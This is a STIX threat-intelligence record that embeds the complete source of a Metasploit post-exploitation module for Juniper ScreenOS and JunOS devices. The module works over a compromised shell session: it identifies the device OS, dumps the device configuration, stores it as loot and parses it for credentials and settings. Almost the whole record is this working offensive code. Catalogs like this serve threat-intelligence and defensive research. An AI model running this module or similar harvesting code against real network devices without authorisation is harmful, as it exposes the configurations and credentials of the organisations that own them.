{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--37246f64-b426-4961-b592-8b9fdc5c1f20",
    "created": "2024-08-14T16:33:17.989659Z",
    "modified": "2024-08-14T16:33:17.989662Z",
    "name": "Juniper Gather Device General Information",
    "description": " This module collects a Juniper ScreenOS and JunOS device information and configuration.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/networking/gather/enum_juniper.rb",
            "external_id": "enum_juniper.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Juniper\n  include Msf::Exploit::Deprecated\n  moved_from 'post/juniper/gather/enum_juniper'\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Juniper Gather Device General Information',\n        'Description' => %q{\n          This module collects a Juniper ScreenOS and JunOS device information and configuration.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'h00die'],\n        'Platform' => [ 'juniper'],\n        'SessionTypes' => [ 'shell' ]\n      )\n    )\n  end\n\n  def run\n    # Get device prompt\n    prompt = session.shell_command('')\n\n    os_type = 'junos'\n    command_prefix = ''\n    if prompt.end_with?('% ') # we're in an SSH shell\n      vprint_status('In an SSH shell')\n      command_prefix = 'cli '\n    elsif prompt.end_with?('-> ') # hit cli of ScreenOS, change the os_type\n      os_type = 'screenos'\n    elsif prompt.end_with?('> ') # cli of JunOS\n      vprint_status('In a cli shell')\n    elsif prompt.end_with?('# ') # we're in a cli>configure\n      vprint_status('In a cli>configure shell')\n      session.shell_command('quit') # gets us back to the cli non-config\n    elsif session.shell_command('?') =~ /\\?: No match\\./ # confirmed ssh shell\n      vprint_status('In an SSH shell')\n      command_prefix = 'cli '\n    end\n\n    if os_type == 'screenos'\n      # Set terminal length to 0 so no paging is required\n      session.shell_write(\"term len 0 \\n\")\n    end\n\n    # Get version info\n    print_status('Getting version information')\n    get_system_cmd = os_type.eql?('screenos') ? 'get system' : 'show configuration'\n    get_system_cmd = command_prefix + get_system_cmd\n    system_out = session.shell_command(get_system_cmd)\n    # https://github.com/h00die/MSF-Testing-Scripts/blob/master/juniper_strings.py#L2\n    # https://kb.juniper.net/InfoCenter/index?page=content&id=KB6489\n    if /^Product Name: (?<ver>SSG|NetScreen)/i =~ system_out\n      vprint_status(\"Original OS Guess #{os_type}, is now ScreenOS #{ver}\")\n      os_type = 'screenos'\n    elsif /^Product Name: (?<ver>.+)/i =~ system_out\n      vprint_status(\"Original OS Guess #{os_type}, is now JunOS #{ver}\")\n      os_type = 'junos'\n    elsif /^version (?<ver>[.\\dR]+);/i =~ system_out\n      vprint_status(\"Original OS Guess #{os_type}, is now JunOS #{ver}\")\n      os_type = 'junos'\n    end\n\n    print_status(\"The device OS is #{os_type}\")\n\n    case os_type\n    when /screenos/\n      ver_loc = store_loot('juniper.screenos.config',\n                           'text/plain',\n                           session,\n                           system_out.strip,\n                           'config.txt',\n                           'Juniper ScreenOS Config')\n    when /junos/\n      ver_loc = store_loot('juniper.junos.config',\n                           'text/plain',\n                           session,\n                           system_out.strip,\n                           'config.txt',\n                           'Juniper JunOS Config')\n    end\n\n    # Print the version of VERBOSE set to true.\n    vprint_good(\"Config information stored in to loot #{ver_loc}\")\n\n    # run additional information gathering\n    enum_configs(prompt, os_type, command_prefix)\n  end\n\n  # run commands found in exec mode under privilege 1\n  def enum_configs(prompt, os_type, command_prefix)\n    host = session.session_host\n    port = session.session_port\n    exec_commands = [\n      {\n        'cmd' => { 'junos' => 'show configuration', 'screenos' => 'get config' },\n        'fn' => 'get_config',\n        'desc' => 'Get Device Config on Juniper Device'\n      },\n    ]\n    exec_commands.each do |ec|\n      command = command_prefix + ec['cmd'][os_type]\n      cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/, '')\n      next if cmd_out =~ /unknown keyword/ # screenOS\n\n      print_status(\"Gathering info from #{command}\")\n      cmd_loc = store_loot(\"juniper.#{ec['fn']}\",\n                           'text/plain',\n                           session,\n                           cmd_out.strip,\n                           \"#{ec['fn']}.txt\",\n                           ec['desc'])\n      vprint_good(\"Saving to #{cmd_loc}\")\n      if os_type == 'screenos'\n        juniper_screenos_config_eater(host, port, cmd_out.strip)\n      elsif os_type == 'junos'\n        juniper_junos_config_eater(host, port, cmd_out.strip)\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'juniper']"
    ]
}